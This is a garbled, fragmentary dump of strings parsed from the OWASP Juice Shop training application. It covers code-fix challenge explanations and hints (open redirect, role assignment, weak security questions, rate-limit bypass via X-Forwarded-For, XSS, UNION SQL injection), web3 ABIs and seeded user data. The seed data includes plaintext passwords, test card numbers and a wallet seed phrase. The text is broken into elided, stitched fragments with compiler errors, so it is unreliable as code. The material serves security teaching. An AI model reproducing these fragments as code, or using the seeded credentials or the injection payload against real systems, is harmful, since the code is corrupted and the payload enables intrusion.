ceshop'http://shop.spreadshirt.com/juiceshophttp://shopspreadshirtcom/juiceshophttp://shop.spreadshirt.de/juiceshopde/juiceshop'https: ... op/794'https://www.stickeryou.com/products/owasp-juice-shop/794https://wwwstickeryoucom/products/owasp-juice-shop/794'http:/ ... e-shop'http://leanpub.com/juice-shophttp://leanpubcom/juice-shopexport  ... owed\r\n}const i ... owed\r\n}isRedir ... owed\r\n}(url: s ... owed\r\n}{\r\n  le ... owed\r\n}let allowed = falseallowed = falsefor (co ... ))\r\n  }const allowedUrl{\r\n     ... ))\r\n  }allowed ... edUrl))url.inc ... edUrl))url.includesencodeU ... wedUrl)return allowedP:/My Drive/Git/juice-shop/data/static/codefixes/redirectChallenge_2.tsfor (co ... l)\r\n  }{\r\n     ... l)\r\n  }allowed ... wedUrl)url.inc ... wedUrl)P:/My Drive/Git/juice-shop/data/static/codefixes/redirectChallenge_3.tsescapeHTML/[&<>'"]/g'&''&amp;''<''&lt;''>''&gt;'"'"'&#39;''"''&quot;'escapeH ... wedUrl)const e ...   })\r\n}escapeH ...   })\r\n}str =>  ...   })\r\n}str.rep ... \n    })str.replace[&<>'"]&tag =>  ... \r\n    }return  ... }[tag])({\r\n    ... }[tag]){\r\n     ...  }[tag]'&': '&amp;'&amp;'<': '&lt;'&lt;'>': '&gt;'&gt;"'": '&#39;'&#39;'"': '&quot;'&quot;P:/My Drive/Git/juice-shop/data/static/codefixes/redirectChallenge_4_correct.tsfor (co ... rl\r\n  }{\r\n     ... rl\r\n  }allowed ... owedUrlurl === allowedUrlP:/My Drive/Git/juice-shop/data/static/codefixes/redirectCryptoCurrencyChallenge.info.ymlThis fix removes one deprecated crypto currency address from the allow list but forgets to deal with two other ones."This f ...  ones."When cleaning up any allow list of deprecated entries, it is crucial to be thorough and re-check the list regularly. Otherwise allow lists tend to become weaker over time."When c ...  time."Can you identify the lines which have something to do with crypto currency addresses?"Can yo ... esses?"Did you notice there is a constant containing allowed redirect web addresses?"Did yo ... esses?"Make sure to select all three lines responsible for crypto currency addresses which are not promoted any longer."Make s ... onger."- "Can  ... esses?"P:/My Drive/Git/juice-shop/data/static/codefixes/redirectCryptoCurrencyChallenge_1.tsP:/My Drive/Git/juice-shop/data/static/codefixes/redirectCryptoCurrencyChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/redirectCryptoCurrencyChallenge_3_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/redirectCryptoCurrencyChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/registerAdminChallenge.info.ymlThis code change will check if a role is already defined on the user entity. If so, it will keep it. If not, it will set "customer" as a fallback role. This still allows anyone to pick their own prefered role, though.'This c ... hough.'Removing the interceptor function completely not only keeps the role assignment possible, it also breaks functionality by no longer creating digital wallets for new users."Removi ... users."This actually fixes the role assignment issue, by overriding any value pre-set via the POST request with a static "customer" default role.'This a ...  role.'This change results in the "role" property not being returned in any User-API responses. This will not prevent setting an arbitrary role during user creation but probably also break some functionality in the client that relies on the role being present.'This c ... esent.'Which entity is this challenge most likely about? Try to find all code places where that entity is somehow processed."Which  ... essed."In this snippet you must look for a place where something is missing that, if present, would negate an arbitrary role assignment."In thi ... nment."Make sure that you do not select any lines that are contained in the vulnerable function but themselves have nothing to do with the vulberability."Make s ... ility."- "Whic ... essed."P:/My Drive/Git/juice-shop/data/static/codefixes/registerAdminChallenge_1.ts    }P:/My Drive/Git/juice-shop/data/static/codefixes/registerAdminChallenge_2.ts    })P:/My Drive/Git/juice-shop/data/static/codefixes/registerAdminChallenge_3_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/registerAdminChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBenderChallenge.info.ymlWhile not necessarily as trivial to research via a user's LinkedIn profile, the question is still easy to research or brute force when answered truthfully."While  ... fully."When answered truthfully, all security questions are susceptible to online research (on Facebook, LinkedIn etc.) and often even brute force. If at all, they should not be used as the only factor for a security-relevant function."When a ... ction."Exchanging "company" with "organization" is only a vocabulary change and has no effect on security.'Exchan ... urity.'Do you remember the security question that Bender used for his account?"Do you ... count?"This question is the source of the security risk in this challenge."This q ... lenge."- "Do y ... count?"P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBenderChallenge_1.ymlYour eldest siblings middle name?'Your e ...  name?'questio ...  name?'Mother's maiden name?"Mother ...  name?"questio ...  name?"Mother's birth date? (MM/DD/YY)"Mother ... DD/YY)"questio ... DD/YY)"Father's birth date? (MM/DD/YY)"Father ... DD/YY)"Maternal grandmother's first name?"Matern ...  name?"Paternal grandmother's first name?"Patern ...  name?"Name of your favorite pet?'Name o ... e pet?'questio ... e pet?'Last name of dentist when you were a teenager? (Do not include 'Dr.')"Last n ... 'Dr.')"questio ... 'Dr.')"Your ZIP/postal code when you were a teenager?'Your Z ... nager?'questio ... nager?'First job you had as a teenager?'First  ... nager?'Your favorite book?'Your f ...  book?'questio ...  book?'Your favorite movie?'Your f ... movie?'questio ... movie?'Number of one of your customer or ID cards?'Number ... cards?'questio ... cards?'What's your favorite place to go hiking?"What's ... iking?"questio ... iking?"P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBenderChallenge_2_correct.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBenderChallenge_3.ymlOrganization you first work for as an adult?'Organi ... adult?'questio ... adult?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernChallenge.info.ymlWhen changing the scope of this question from "teenager" to "toddler", researching a past place of residence still is the only (low) hurdle for the attacker.'When c ... acker.'Researching someone's current place of residence is probably even easier than a past one."Resear ... t one."Do you remember the security question that Bjoern used for his account?P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernChallenge_1_correct.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernChallenge_2.ymlYour ZIP/postal code when you were a toddler?'Your Z ... ddler?'questio ... ddler?'Company you first work for as an adult?'Compan ... adult?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernChallenge_3.ymlYour ZIP/postal code where you live today?'Your Z ... today?'questio ... today?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernOwaspChallenge.info.ymlThis fix option is obviously (?) a joke. But it should still illustrate that narrowing the scope of a question reduces the solution space accordingly, thus making "social stalking" and brute force much easier.'This f ... asier.'There are even less car brands in the world than potential pet names. Therefore, changing the security questions has even a negative effect on overall security as it makes guessing and brute forcing much easier."There  ... asier."Do you remember the security question that Bjoern used for his OWASP account?P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernOwaspChallenge_1.ymlName of your favorite super-cute three-legged cat?'Name o ... d cat?'questio ... d cat?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernOwaspChallenge_2_correct.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordBjoernOwaspChallenge_3.ymlBrand of your favorite car?'Brand  ... e car?'questio ... e car?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordJimChallenge.info.ymlWidening the scope from an "eldest sibling" to "any family member" still allows the question to be easily researched online (on Facebook etc.) or brute forced when answered truthfully.'Wideni ... fully.'Tightening the scope from an "eldest sibling" to "eldest brother" reduces any brute force effort to only male forenames, assuming the question is answered truthfully.'Tighte ... fully.'Do you remember the security question that Jim used for his account?P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordJimChallenge_1.ymlAny family member's middle name?"Any fa ...  name?"P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordJimChallenge_2.ymlYour eldest brothers middle name?P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordJimChallenge_3_correct.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordMortyChallenge.info.ymlRemoving the setting to trust proxies does not improve security of the rate limiting. It might have some unforseen or unintended functional side-effects, though."Removi ... hough."Replacing the "X-Forwarded-For" header with its standardized alternative "Forwarded" does not close the security flaw of how this header is actually being used and can be abused by attackers.'Replac ... ckers.'Reducing the rate limit from 100 requests in 5min to 10 reqests in 3min could be seen as a security improvement, if there wasn't an entirely unrelated misconfiguration at play here."Reduci ...  here."Removing the custom key generator that lets an arbitrary HTTP header take precedence over the client IP is the best option here. Now an attacker at least needs to fake their actual IP to bypass the rate limiting, as this is the default key for the RateLimit module used here. There is a functional downside though, as now users behin e.g. corporate proxies might be rate limited as a group and not individually. But with 100 allowed password resets in 5min this should not occur too frequently."Removi ... ently."The security flaw has something to do with the rate limiting configuration."The se ... ation."Do you think the time window or number of requests is the actual problem here? Maybe there is something else going wrong..."Do you ... ong..."Take a close look at the HTTP header being used here and ask yourself: "Could an attacker do anything with it to bypass rate limiting?"'Take a ... ting?"'- "The  ... ation."P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordMortyChallenge_1.ts Rate limiting /* Rate limiting */'/rest/user/reset-password'RateLimitwindowMs60100keyGenerator'X-Forwarded-For'app.use ... \r\n  }))'/rest/ ... ssword'/rest/user/reset-passwordnew Rat ... }\r\n  })windowM ...  * 10005 * 60 * 10005 * 60max: 100keyGene ... ?? ip }{ headers, ip }{ retur ... ?? ip }return  ... ] ?? ipheaders ... ] ?? ipheaders ... d-For']X-Forwarded-ForP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordMortyChallenge_2.ts'trust proxy''Forwarded'app.ena ... proxy')app.enabletrust proxyheaders['Forwarded']ForwardedP:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordMortyChallenge_3.ts3 * 60 * 10003 * 60max: 10P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordMortyChallenge_4_correct.tsnew Rat ... ,\r\n  }){\r\n     ... 0,\r\n  }P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordUvoginChallenge.info.ymlNarrowing the scope of the question from "movie" to "anim" dramatically reduces the solution space, thus making guessing and brute force attacks a lot easier.'Narrow ... asier.'When changing the scope of this question from "movie" to "actor/actress", researching and brute forcing is probably just as easy for the attacker.Do you remember the security question that Uvogin used for his account?P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordUvoginChallenge_1.ymlYour favorite anim?'Your f ... anim\u00e9?'questio ... anim\u00e9?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordUvoginChallenge_2.ymlYour favorite actor or actress?'Your f ... tress?'questio ... tress?'P:/My Drive/Git/juice-shop/data/static/codefixes/resetPasswordUvoginChallenge_3_correct.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/restfulXssChallenge.info.ymlRemoving the bypass of sanitization entirely is the best way to fix the XSS vulnerability here. It should be noted, that XSS is only a consequence of broken authorization in this case, as users should not be allowed to change product descriptions in the first place.'Removi ... place.'Manually encoding the angular brackets of the HTML tags does not add any security. It is likely to break descriptions with legitimate HTML tags for styling or links, though.'Manual ... hough.'The removed code block deals with handling of different screen sizes and is entirely unrelated to the given XSS vulnerability.'The re ... ility.'Using bypassSecurityTrustScript() instead of bypassSecurityTrustHtml() changes the context for which input sanitization is bypassed. If at all, this switch might only accidentally keep XSS prevention intact.'Using  ... ntact.'Find all places in the code which are handling the product descriptions."Find a ... tions."- "Find ... tions."P:/My Drive/Git/juice-shop/data/static/codefixes/restfulXssChallenge_1_correct.tsngAfterViewInit () {
P:/My Drive/Git/juice-shop/data/static/codefixes/restfulXssChallenge_2.tsError: ',' expected.  encodeProductDescription (tableData: any[]) {
Error: An element access expression should take an argument.P:/My Drive/Git/juice-shop/data/static/codefixes/restfulXssChallenge_3.ts  trustProductDescription (tableData: any[]) {
P:/My Drive/Git/juice-shop/data/static/codefixes/restfulXssChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/scoreBoardChallenge.info.ymlIn this one-of-a-kind scenario it is really best to just leave the code unchanged. Fiddling with it might either break accessibility of the crucial Score Board screen or make it unnecessarily harder to find it.'In thi ... nd it.'Obfuscating the path to the Score Board does not add any security, even if it wasn't just a trivial Base64 encoding. It would, on the other hand, make finding it a bit more difficulty. This is probably not intended as the Score Board screen is the hub for all other challenges."Obfusc ... enges."Removing the entire route mapping would improve security but also break functionality by making the Score Board entirely inaccessible. Keep in mind that the Score Board is hidden only to be found and used to track all the other challenges.'Removi ... enges.'Among the long list of route mappings, can you spot any that seem responsible for the Score Board screen?"Among  ... creen?"If you accidentally scrolled over the relevant line, try using the text search in your browser."If you ... owser."Searching for "score" should bring you to the right route mapping.'Search ... pping.'- "Amon ... creen?"P:/My Drive/Git/juice-shop/data/static/codefixes/scoreBoardChallenge_1_correct.ts Must remain as is! Needed for challenge tracking!// Must ... acking!P:/My Drive/Git/juice-shop/data/static/codefixes/scoreBoardChallenge_2.ts'c2NvcmUtYm9hcmQ='path: a ... hcmQ=')atob('c ... hcmQ=')c2NvcmUtYm9hcmQ=P:/My Drive/Git/juice-shop/data/static/codefixes/scoreBoardChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/tokenSaleChallenge.info.ymlObfuscating the path to the Token Sale page with Base64 instead of the original obfuscation function does not add any security. It actually makes the route even more easily identifiable."Obfusc ... iable."Restricting access to the Token Sale page to administrators might sound good in theory. Unfortunately this all only happens in client-side code, so such check couldn't be fully trusted."Restri ... usted."The only viable way to prevent access to a soon-to-be-released Token Sale page is to not have it in the client-side code before its actual release. It then makes sense to not have any premature route mapping declarations either. This then makes the whole obfuscation code-madness unnecessary as well."The on ...  well."Where is the Token Sale page actually being handled?"Where  ... ndled?"What is weird about how the Token Sale route is being declared?"What i ... lared?"If the Token Sale page is still considered a secret, why is it mapped to a route at all?"If the ... t all?"- "Wher ... ndled?"P:/My Drive/Git/juice-shop/data/static/codefixes/tokenSaleChallenge_1.ts    data: { params: (window.location.href).substr(window.location.href.indexOf('#')) },
Error: Declaration or statement expected.  },
    component: TokenSaleComponent
    component: ErrorPageComponent
    component: SearchResultComponent
]
P:/My Drive/Git/juice-shop/data/static/codefixes/tokenSaleChallenge_2.ts    component: TokenSaleComponent,
    canActivate: [AdminGuard]
P:/My Drive/Git/juice-shop/data/static/codefixes/tokenSaleChallenge_3_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/unionSqlInjectionChallenge.info.ymlLimiting the allowed search values via startsWith() would still allow SQL Injection via "orange')) UNION SELECT ... --" or similarly prefixed payloads. Even worse, this fix also breaks the free text search capability."Limiti ... ility."P:/My Drive/Git/juice-shop/data/static/codefixes/unionSqlInjectionChallenge_1.ts/"|'|;|and|or/i""criteri ... /i, "")criteria.replace"|'|;|and|orP:/My Drive/Git/juice-shop/data/static/codefixes/unionSqlInjectionChallenge_2_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/unionSqlInjectionChallenge_3.ts only allow apple or orange related searches// only ... earches"apple""orange"if (!cr ... \r\n    }!criter ... range")!criter ... apple")criteri ... apple")criteria.startsWithapplecriteri ... range")orangeP:/My Drive/Git/juice-shop/data/static/codefixes/weakPasswordChallenge.info.ymlAccording to NIST-800-63B, passwords (Memorized Secrets) should have at least eight characters to prevent 'online attacks'. Furthermore, NIST-800-63B requires that passwords don't appear in common dictionaries. If you want to have more fun with secrets, check out OWASP Wrong Secrets at https://wrongsecrets.fly.dev/, specially challenge 16 and 23."Accord ... naries.According to NIST-800-63B, passwords (Memorized Secrets) should have at least eight characters to prevent 'online attacks'. Usage of special character tests is not appropriate (anymore) because users tend to find known workarounds like notes with passwords or adding an exclamation mark at the end to add a special character."Accord ... acter."According to NIST-800-63B passwords (Memorized Secrets) should have at least 8 characters to prevent 'online attacks'."Accord ... acks'."NIST Special Publication 800-63B has changed the recommendation for passwords (Memorized Secrets) requirements in 2017."NIST S ...  2017."- "NIST ...  2017."P:/My Drive/Git/juice-shop/data/static/codefixes/weakPasswordChallenge_1_correct.ts      password: {
Error: ')' expected.      },P:/My Drive/Git/juice-shop/data/static/codefixes/weakPasswordChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/weakPasswordChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/weakPasswordChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/codefixes/web3SandboxChallenge.info.ymlThis sandbox is for the developers of the application and was added for easy testing and prototyping. Functionality like this does under no circumstances belong into an application when it goes into production!'This s ... ction!'This sandbox is for the developers of the application and was added for easy testing and prototyping. Should it really be accessible for any user - even the eCommerce customers - who logged into the shop?'This s ...  shop?'This sandbox is for the developers of the application and was added for easy testing and prototyping. Are administrators of the web shop really the target audience for such a functionality?'This s ... ality?'Among the long list of route mappings, can you spot any that relates to a web3 sandbox feature?"Among  ... ature?"Searching for "web3" should bring up some interesting route mappings.'Search ... pings.'- "Amon ... ature?"P:/My Drive/Git/juice-shop/data/static/codefixes/web3SandboxChallenge_1_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/web3SandboxChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/web3SandboxChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/web3WalletChallenge.info.ymlP:/My Drive/Git/juice-shop/data/static/codefixes/xssBonusChallenge.info.ymlUsing bypassSecurityTrustSoundCloud() instead of bypassSecurityTrustHtml() supposedly bypasses sanitization to allow only content from that service provider. Not surprisingly, there is no such vendor-specific function bypassSecurityTrustSoundCloud() offered by the Angular DomSanitizer.'Using  ... tizer.'Using bypassSecurityTrustIframe() instead of bypassSecurityTrustHtml() supposedly bypasses sanitization to allow only <iframe> tags. But, the Angular DomSanitizer does not offer tag-specific bypass functions.'Using  ... tions.'P:/My Drive/Git/juice-shop/data/static/codefixes/xssBonusChallenge_1_correct.tsP:/My Drive/Git/juice-shop/data/static/codefixes/xssBonusChallenge_2.tsP:/My Drive/Git/juice-shop/data/static/codefixes/xssBonusChallenge_3.tsP:/My Drive/Git/juice-shop/data/static/codefixes/xssBonusChallenge_4.tsP:/My Drive/Git/juice-shop/data/static/contractABIs.tsnftABIstateMutability'nonpayable''constructor'anonymousindexedinternalType'address''owner''approved''uint256''tokenId''Approval''event''operator''bool''ApprovalForAll''NFTMinted''previousOwner''newOwner''OwnershipTransferred''from''to''Transfer''approve''function''balanceOf''view''fixedMetadataHash''getApproved''isApprovedForAll''mintNFT''mintPrice''name''ownerOf''renounceOwnership''safeTransferFrom''bytes''data''setApprovalForAll''bytes4''interfaceId''supportsInterface''symbol''token''contract IERC20''tokenURI''totalSupply''transferFrom''transferOwnership'web3WalletABI'culprit''ContractExploited''_who''balance''balances''_to''ethdeposit''payable''userWithdrawing''_amount''withdraw''receive'export  ... \n  }\r\n]const n ... \n  }\r\n]nftABI  ... \n  }\r\n]{\r\n     ... r'\r\n  }inputs: []stateMu ... ayable'nonpayabletype: 'constructor'{\r\n     ... t'\r\n  }anonymous: falseinputs: ... \r\n    ]indexed: trueinterna ... ddress'name: 'owner'ownertype: 'address'name: 'approved'approvedinterna ... int256'uint256name: 'tokenId'tokenIdtype: 'uint256'name: 'Approval'Approvaltype: 'event'name: 'operator'indexed: falseinternalType: 'bool'booltype: 'bool'name: ' ... ForAll'ApprovalForAllname: 'NFTMinted'NFTMintedname: ' ... sOwner'previousOwnername: 'newOwner'newOwnername: ' ... ferred''Owners ... ferred'OwnershipTransferredname: 'from'name: 'to'name: 'Transfer'Transfername: 'approve'approveoutputs: []type: 'function'name: 'balanceOf'balanceOfoutputs ... \r\n    ]name: ''stateMu ...  'view'name: ' ... taHash'fixedMetadataHashinterna ... string'type: 'string'name: 'getApproved'getApprovedisApprovedForAllname: 'mintNFT'mintNFTname: 'mintPrice'mintPricename: 'name'name: 'ownerOf'ownerOfname: ' ... ership'renounceOwnershipname: ' ... erFrom'safeTransferFrominterna ... 'bytes'bytesname: 'data'type: 'bytes'setApprovalForAllinterna ... bytes4'bytes4name: 'interfaceId'interfaceIdtype: 'bytes4'supportsInterfacename: 'symbol'name: 'token'interna ... IERC20'contract IERC20name: 'tokenURI'tokenURIname: 'totalSupply'totalSupplyname: 'transferFrom'transferFromtransferOwnershipconst w ... \n  }\r\n]web3Wal ... \n  }\r\n]name: 'culprit'culpritname: ' ... loited'ContractExploitedname: '_who'_whoname: 'balance'name: 'balances'balancesname: '_to'_toname: 'ethdeposit'ethdepositpayablename: ' ... rawing'userWithdrawingname: '_amount'_amountname: 'withdraw'withdraw{\r\n     ... e'\r\n  }type: 'receive'receiveP:/My Drive/Git/juice-shop/data/static/deliveries.ymlOne Day Delivery'One Day Delivery'0.5fas fa-rocket'fas fa-rocket'name: ' ... livery'Fast Delivery'Fast Delivery'fas fa-shipping-fast'fas fa ... g-fast'Standard Delivery'Standard Delivery'fas fa-truck'fas fa-truck'P:/My Drive/Git/juice-shop/data/static/securityQuestions.ymlquestio ... allenge- # vul ... allengeP:/My Drive/Git/juice-shop/data/static/users.ymladmin123'admin123''admin'@xI98PxDO+06!'@xI98PxDO+06!'I love this shop! Best products in town! Highly recommended!'I love ... ended!'comment ... ended!'Administrator'Administrator'12345678904711'4711'0815 Test Street'0815 Test Street'Test'Test'fullNam ... trator'- fullN ... trator'4716190207394368208140240071056481082086email: adminncc-1701'ncc-1701'customer'customer'Samuel'Samuel'Great shop! Awesome service!'Great  ... rvice!'Jim'Jim'5234234321701'1701'Room 3F 121'Room 3F 121'Deck 5'Deck 5'USS Enterprise'USS Enterprise'Space'Space'fullName: 'Jim'Sam'Sam'1000000783GSK783'GSK783'Deneva Colony'Deneva Colony'Deneva'Deneva'Beta Darius System'Beta Darius System'United Federation of Planets'United ... lanets'fullName: 'Sam'- fullName: 'Jim'51078917222787052099email: jimOhG0dPlease1nsertLiquor!'OhG0dP ... iquor!'Stop'n'Drop"Stop'n'Drop"id: 10Nothing useful available here!'Nothin ...  here!'comment ...  here!'Bender'Bender'79767534510001'10001'Robot Arms Apts 42'Robot Arms Apts 42'New New York'New New York'Planet Earth'Planet Earth'fullName: 'Bender'- fullName: 'Bender'4716943969046208email: benderbjoern.kimminich@gmail.combjoern. ... ail.combW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI='bW9jLm ... VvamI='Bjoern Kimminich'Bjoern Kimminich'491700000125436'25436'Am Lokalhorst 42'Am Lokalhorst 42'Uetersen'Uetersen'Schleswig-Holstein'Schleswig-Holstein''Germany'fullNam ... minich'- fullN ... minich'48152056055427542092email:  ... ail.commDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb'mDLx?9 ... c!YbJb''deluxe'Brd?j8sEMziOvvBfBe?jFZ77H?hgm'Brd?j8 ... 7H?hgm'id: 7email: cisoJ6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P'J6aVjT ... E@RF$P'SC OLEA SRL'SC OLEA SRL'email: supportfocusOnScienceMorty!focusOnScience'focusO ... cience'5N0wb41L'5N0wb41L'email: mortymc.safesearchMr. N00dles'Mr. N00dles'I even shared my pizza bagels with you!'I even ... h you!'id: 8email: mc.safesearchJ129340Y8rMnww$*9VFYE59-!Fg1L6t&6lB'0Y8rMn ... 6t&6lB'azjTLprq2im6p86RbFrA41L'azjTLp ... FrA41L'email: J12934wurstbrotEinBelegtesBrotMitSchinkenSCHINKEN!'EinBel ... INKEN!'IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KHIFTXE3S ... J4HC3KHtimoNZMJLjEinU7TFElDIYW8'NZMJLj ... lDIYW8'email: wurstbrotamyK1f.....................'K1f... ... ......'Dr. Dr. Dr. Dr. Zoidberg'Dr. Dr ... idberg'email: amymonkey summer birthday are all bad passwords but work just fine in a long passphrase'monkey ... phrase'12.png'12.png'West-2082'West-2082'id: 9email: bjoernbjoern@owasp.orgkitten lesser pooch karate buffoon indoors'kitten ... ndoors'13.jpg'13.jpg'Zaya'Zaya'email:  ... asp.orgchris.pikeuss enterprise'uss enterprise'chrisgreenwood'greenwood'email: chris.pikei am an awesome accountant'i am a ... untant'sdAffsdfrefrbgreq3423'sdAffs ... eq3423'email: accountantmuda-muda > ora-ora'muda-m ... ra-ora'Silence of the Lambs'Silenc ...  Lambs'id: 12email: uvoginACME Inc.'ACME Inc.'Tim Tester'Tim Tester'491700000012345'12345'Dummystreet 42'Dummystreet 42'Mocktown'Mocktown'Testilvania'Testilvania'United Fakedom'United Fakedom'fullNam ... Tester'- fullN ... Tester'1234567812345678email: demoj0hNnyy&x5Z#f6W532Z4445#Ae2HkwZVyDb7&oCUaDzFU'y&x5Z# ... UaDzFU'email: johnE=maE=ma\u00b2y&x5Z#f6W532ZUf$q3DsdgfgfgxxUsvoCUaDzFUemail: emmaSmilinStanship coffin krypt cross estate supply insurance asbestos souvenir'ship c ... uvenir'20.jpg'20.jpg'Used Ship Emporium"Used Ship Emporium"email: stanethereumevmrox'private'Please send me the juicy chatbot NFT in my wallet at /juicy-nft : "purpose betray marriage blame crunch monitor spin slide donate sport lift clutch"'Please ... lutch"'comment ... lutch"'Used Emporium"Used Emporium"email: ethereumP:/My Drive/Git/juice-shop/data/staticData.ts'path''fs/promises'safeLoad'js-yaml'loadStaticDatafilePath'./data/static/''.yml''utf8''Could not open file: "'StaticUserSecurityQuestionStaticUserFeedback'users'StaticChallenge'challenges'StaticDelivery'deliveries'StaticSecurityQuestions'securityQuestions'import  ...  'path'import  ... omises'fs/promisesimport  ... s-yaml'js-yamlexport  ... "'))\r\n}async f ... "'))\r\n}{\r\n  co ... "'))\r\n}const f ... '.yml')filePat ... '.yml')path.re ... '.yml')'./data ...  '.yml''./data ...  + file./data/static/.ymlreturn  ... + '"'))await r ... + '"'))readFil ... + '"'))readFil ...  .catchreadFil ... feLoad)readFil ...   .thenreadFil ... 'utf8')utf8() => l ...  + '"')logger. ...  + '"')'Could  ... h + '"''Could  ... ilePath'Could  ... ile: "'Could not open file: "export  ... rd[]\r\n}interfa ... rd[]\r\n}email: stringpassword: stringrole: ' ... unting''admin' ... unting'username?: stringprofile ...  stringwalletB ...  numberlastLoginIp?: stringdeleted ... booleantotpSecret?: stringcustomD ... booleansecurit ... uestionStaticU ... uestionfeedbac ... eedbackaddress ... dress[]card?:  ... rCard[]export  ... ring\r\n}interfa ... ring\r\n}answer: stringexport  ...  | 5\r\n}interfa ...  | 5\r\n}comment: stringrating: ... | 4 | 51 | 2 | 3 | 4 | 5fullName: stringmobileNum: numberzipCode: stringstreetA ...  stringcity: stringstate: stringcountry: stringexport  ... mber\r\n}interfa ... mber\r\n}cardNum: numberexpMonth: numberexpYear: numberexport  ... er[]\r\n}async f ... er[]\r\n}Promise ... User[]>StaticUser[]{\r\n  re ... er[]\r\n}return  ... cUser[]await l ... cUser[]await l ... users')loadSta ... users')interfa ... \n  }\r\n}category: stringtags?: string[]string[]description: stringdifficulty: numberhint: stringhintUrl: stringmitigat ...  stringdisable ... tring[]tutoria ... er\r\n  }{\r\n     ... er\r\n  }order: numberexport  ... ge[]\r\n}async f ... ge[]\r\n}Promise ... enge[]>StaticChallenge[]{\r\n  re ... ge[]\r\n}return  ... lenge[]await l ... lenge[]await l ... enges')loadSta ... enges')price: numberdeluxePrice: numbereta: numbericon: stringexport  ... ry[]\r\n}async f ... ry[]\r\n}Promise ... very[]>StaticDelivery[]{\r\n  re ... ry[]\r\n}return  ... ivery[]await l ... ivery[]await l ... eries')loadSta ... eries')StaticS ... estionsquestion: stringexport  ... ns[]\r\n}async f ... ns[]\r\n}Promise ... ions[]>StaticS ... tions[]{\r\n  re ... ns[]\r\n}return  ... tions[]await l ... tions[]await l ... tions')loadSta ... tions')securityQuestionsP:/My Drive/Git/juice-shop/data/types.ts'models/address'CaptchaModel'models/captcha''models/card''models/delivery''models/memory''models/recycle''models/securityAnswer''models/securityQuestion'ChallengeUserDeliveryCardReviewlikedRecycleSecurityQuestionSecurityAnswerBasketBasketItemCaptchamodels/addressimport  ... aptcha'models/captchamodels/cardmodels/deliverymodels/memorymodels/recycle'models ... Answer'models/securityAnswer'models ... estion'models/securityQuestionexport  ... geModeltype Ch ... geModelexport  ... erModeltype Us ... erModelexport  ... ryModeltype De ... ryModelexport  ... ssModeltype Ad ... ssModelexport  ... rdModeltype Ca ... rdModelexport  ... ctModeltype Pr ... ctModelexport  ... ng[]\r\n}interfa ... ng[]\r\n}text: stringauthor: stringliked: booleanlikedBy: string[]type Me ... ryModelexport  ... leModeltype Re ... leModelexport  ... onModeltype Se ... onModeltype Se ... erModelexport  ... etModeltype Ba ... etModelexport  ... emModeltype Ba ... emModelexport  ... haModeltype Ca ... haModelP:/My Drive/Git/juice-shop/docker-compose.test.yml"3.3"servicessut./test/smoke/- appbuild: ./test/smoke/bkimminich/juice-shop:latest-amd64bkimmin ... t-amd64./image:  ... t-amd64sut:version: "3.3"P:/My Drive/Git/juice-shop/frontend/.eslintrc.jsP:/My Drive/Git/juice-shop/frontend requires the `strictNullChecks` compiler option// requ ...  option'./src/tsconfig.*.json'sourceType'module''@typescript-eslint/prefer-nullish-coalescing''@typescript-eslint/consistent-type-assertions''@typescript-eslint/no-floating-promises''@typescript-eslint/restrict-template-expressions''@typescript-eslint/no-confusing-void-expression'{\r\n  ex ... \n  }\r\n}extends ... t'\r\n  ][\r\n     ... t'\r\n  ]root: trueparserO ... e'\r\n  }project ... *.json''./src/ ... *.json'./src/tsconfig.*.json/src/tsconfig.*sourceType: 'module'ignoreP ... s'\r\n  ][\r\n     ... s'\r\n  ]rules:  ... f'\r\n  }{\r\n     ... f'\r\n  }'@types ... escing'@typescript-eslint/prefer-nullish-coalescing'@types ... rtions'@typescript-eslint/consistent-type-assertions'@types ... omises'@typescript-eslint/no-floating-promises@typescript-eslint/restrict-template-expressions'@types ... ession'@typescript-eslint/no-confusing-void-expressionP:/My 